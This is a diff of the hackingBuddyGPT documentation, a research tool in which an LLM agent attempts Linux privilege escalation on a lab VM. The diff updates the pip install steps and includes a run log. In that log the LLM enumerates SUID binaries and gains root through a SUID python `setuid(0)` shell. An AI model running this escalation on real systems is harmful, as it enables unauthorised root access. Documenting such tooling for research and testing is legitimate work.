@@ -16,44 +16,29 @@ For this, you will need an OpenAI API account. After setup, you can find the nee
 
 Currently, May 2024, running hackingBuddyGPT with `GPT-4-turbo` against a benchmark containing 13 VMs (with maximum 20 tries per VM) cost around $5. An alternative is using [Ollama](https://ollama.com/) locally through it's OpenAI-compatible API, but this depends upon possessing beefy NPU/GPUs.
 
-## Setting up HackingBuddyGPT
+## Installing up HackingBuddyGPT
 
-We try to keep our python dependencies as light as possible. This should allow for easier experimentation.
-
-First, clone the github repository:
-
-```bash
-$ git clone https://github.com/ipa-lab/hackingBuddyGPT.git
-$ cd hackingBuddyGPT
-```
-
-As a second step, we will create a new virtual python environment and install required libraries into it:
+HackingBuddyGPT can now be installed through pip, simplifying installation and updating. We will still use a `venv` based virtual python environment so that your installed python packages will not clash with the system's python packages:
 
 ```bash
 # setup virtual python environment
 $ python -m venv venv
 $ source ./venv/bin/activate
 
-# install python requirements
-$ pip install -e .
+# install hackingBuddyGPT
+$ pip install hackingBuddyGPT
 ```
 
-Next, we need to setup some defaults, e.g., the OpenAI API key if you want to use its hosted models:
+This will install two (identical) executable files: `wintermute` and `hackingBuddyGPT`.
+
+Now you should be able to list the available agents through the `wintermute` command line tool which lists the available agents at the end:
 
 ```bash
-# copy default .env.example
-$ cp .env.example .env
-
-# IMPORTANT: setup your OpenAI API key, the VM's IP and credentials within .env
-$ vi .env
-```
-
-Now you should be able to list the available agents through our `wintermute.py` command line tool:
-
-```bash
-$ python wintermute.py
-usage: wintermute.py [-h] {linux_privesc,minimal_linux_privesc,windows privesc} ...
-wintermute.py: error: the following arguments are required: {linux_privesc,windows privesc}
+$ wintermute
+usage: wintermute [-h]
+                  {linux_privesc_hintfile,linux_privesc_guided,linux_privesc,windows_privesc,minimal_linux_privesc,minimal_linux_templated_agent,simple_web_test,simple_web_api_testing,simple_web_api_documentation}
+                  ...
+wintermute: error: the following arguments are required: {linux_privesc_hintfile,linux_privesc_guided,linux_privesc,windows_privesc,minimal_linux_privesc,minimal_linux_templated_agent,simple_web_test,simple_web_api_testing,simple_web_api_documentation}
 ```
 
 ## Provide a Target Machine over SSH
@@ -74,56 +59,80 @@ Finally we can run hackingBuddyGPT against our provided test VM. Enjoy!
 Usage of hackingBuddyGPT for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.
 {% /callout %}
 
-With that out of the way, let's look at an example hackingBuddyGPT run. Each run is structured in rounds. At the start of each round, hackingBuddyGPT asks a LLM for the next command to execute (e.g., `whoami`) for the first round. It then executes that command on the virtual machine, prints its output and starts a new round (in which it also includes the output of prior rounds) until it reaches step number 20 or becomes root:
+With that out of the way, let's look at an example hackingBuddyGPT run. Each run is structured in rounds. At the start of each round, hackingBuddyGPT asks a LLM for the next command to execute (e.g., `whoami`) for the first round. It then executes that command on the virtual machine, prints its output and starts a new round (in which it also includes the output of prior rounds) until it reaches step number 10 or becomes root:
+
 
 ```bash
-# start wintermute, i.e., attack the configured virtual machine
-$ python wintermute.py minimal_linux_privesc --conn.host 192.168.122.151
-[14:49:00] Starting turn 1 of 20                                   common_patterns.py:44
-╭─────────────────────────────── Got command from LLM: ────────────────────────────────╮
-│ whoami                                                                               │
-╰──────────────────────────────────────────────────────────────────────────────────────╯
-╭─────────────────────────────────────── whoami ───────────────────────────────────────╮
-│ lowpriv                                                                              │
-│                                                                                      │
-╰──────────────────────────────────────────────────────────────────────────────────────╯
-[14:49:01] Starting turn 2 of 20                                   common_patterns.py:44
-╭─────────────────────────────── Got command from LLM: ────────────────────────────────╮
-│ sudo -l                                                                              │
-╰──────────────────────────────────────────────────────────────────────────────────────╯
-╭────────────────────────────────────── sudo -l ───────────────────────────────────────╮
-│ Sorry, user lowpriv may not run sudo on test-1.                                      │
-│                                                                                      │
-╰──────────────────────────────────────────────────────────────────────────────────────╯
-[14:49:02] Starting turn 3 of 20                                   common_patterns.py:44
-╭─────────────────────────────── Got command from LLM: ────────────────────────────────╮
-│ find / -perm -u=s -type f 2>/dev/null                                                │
-╰──────────────────────────────────────────────────────────────────────────────────────╯
-╭─────────────────────── find / -perm -u=s -type f 2>/dev/null ────────────────────────╮
-│ /usr/bin/newgrp                                                                      │
-│ /usr/bin/gpasswd                                                                     │
-│ /usr/bin/su                                                                          │
-│ /usr/bin/find                                                                        │
-│ /usr/bin/chfn                                                                        │
-│ /usr/bin/passwd                                                                      │
-│ /usr/bin/python3.11                                                                  │
-│ /usr/bin/chsh                                                                        │
-│ /usr/bin/umount                                                                      │
-│ /usr/bin/sudo                                                                        │
-│ /usr/bin/mount                                                                       │
-│ /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                          │
-│ /usr/lib/openssh/ssh-keysign                                                         │
-│                                                                                      │
-╰──────────────────────────────────────────────────────────────────────────────────────╯
-[14:49:04] Starting turn 4 of 20                                   common_patterns.py:44
-╭─────────────────────────────── Got command from LLM: ────────────────────────────────╮
-│ /usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("/bin/bash")'             │
-╰──────────────────────────────────────────────────────────────────────────────────────╯
+$ wintermute minimal_linux_privesc --llm.api_key=sk-... --llm.model=gpt-4-turbo --llm.context_size=8192 --conn.host=192.168.122.151 --conn.username=lowpriv --conn.password=trustno1 --conn.hostname=test1
+[10:56:20] Starting turn 1 of 10                                               common_patterns.py:45
+╭───────────────────────────────────── Got command from LLM: ──────────────────────────────────────╮
+│ exec_command id                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭──────────────────────────────────────── exec_command id ─────────────────────────────────────────╮
+│ uid=1001(lowpriv) gid=1001(lowpriv) groups=1001(lowpriv)                                         │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
+[10:56:21] Starting turn 2 of 10                                               common_patterns.py:45
+╭───────────────────────────────────── Got command from LLM: ──────────────────────────────────────╮
+│ exec_command sudo -l                                                                             │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭────────────────────────────────────── exec_command sudo -l ──────────────────────────────────────╮
+│ Sorry, user lowpriv may not run sudo on test-1.                                                  │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
+[10:56:23] Starting turn 3 of 10                                               common_patterns.py:45
+╭───────────────────────────────────── Got command from LLM: ──────────────────────────────────────╮
+│ exec_command find / -perm -u=s -type f 2>/dev_code/null                                          │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭──────────────────── exec_command find / -perm -u=s -type f 2>/dev_code/null ─────────────────────╮
+│ sh: 1: cannot create /dev_code/null: Directory nonexistent                                       │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
+[10:56:24] Starting turn 4 of 10                                               common_patterns.py:45
+╭───────────────────────────────────── Got command from LLM: ──────────────────────────────────────╮
+│ exec_command find / -perm -u=s -type f 2>/dev/null                                               │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭─────────────────────── exec_command find / -perm -u=s -type f 2>/dev/null ───────────────────────╮
+│ /usr/bin/newgrp                                                                                  │
+│ /usr/bin/gpasswd                                                                                 │
+│ /usr/bin/su                                                                                      │
+│ /usr/bin/find                                                                                    │
+│ /usr/bin/chfn                                                                                    │
+│ /usr/bin/passwd                                                                                  │
+│ /usr/bin/python3.11                                                                              │
+│ /usr/bin/chsh                                                                                    │
+│ /usr/bin/umount                                                                                  │
+│ /usr/bin/sudo                                                                                    │
+│ /usr/bin/mount                                                                                   │
+│ /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                      │
+│ /usr/lib/openssh/ssh-keysign                                                                     │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
+[10:56:27] Starting turn 5 of 10                                               common_patterns.py:45
+╭───────────────────────────────────── Got command from LLM: ──────────────────────────────────────╮
+│ exec_command /usr/bin/python3.11 -c 'import os; os.system("/bin/sh")'                            │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
 TIMEOUT! Could we have become root?
-╭────── /usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("/bin/bash")' ──────╮
-│ root@test-1:~#                                                                │
-╰──────────────────────────────────────────────────────────────────────────────────────╯
-╭──────────────────────────────────── Run finished ────────────────────────────────────╮
-│ Got Root!                                                                            │
-╰──────────────────────────────────────────────────────────────────────────────────────╯
+╭───────────── exec_command /usr/bin/python3.11 -c 'import os; os.system("/bin/sh")' ──────────────╮
+│ $                                                                                                │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
+[10:56:38] Starting turn 6 of 10                                               common_patterns.py:45
+╭───────────────────────────────────── Got command from LLM: ──────────────────────────────────────╮
+│ exec_command whoami                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭────────────────────────────────────── exec_command whoami ───────────────────────────────────────╮
+│ lowpriv                                                                                          │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
+[10:56:39] Starting turn 7 of 10                                               common_patterns.py:45
+╭───────────────────────────────────── Got command from LLM: ──────────────────────────────────────╮
+│ exec_command /usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("/bin/sh")'              │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
+TIMEOUT! Could we have become root?
+╭────── exec_command /usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("/bin/sh")' ───────╮
+│ #                                                                                                │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭────────────────────────────────────────── Run finished ──────────────────────────────────────────╮
+│ Got Root!                                                                                        │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
 ```
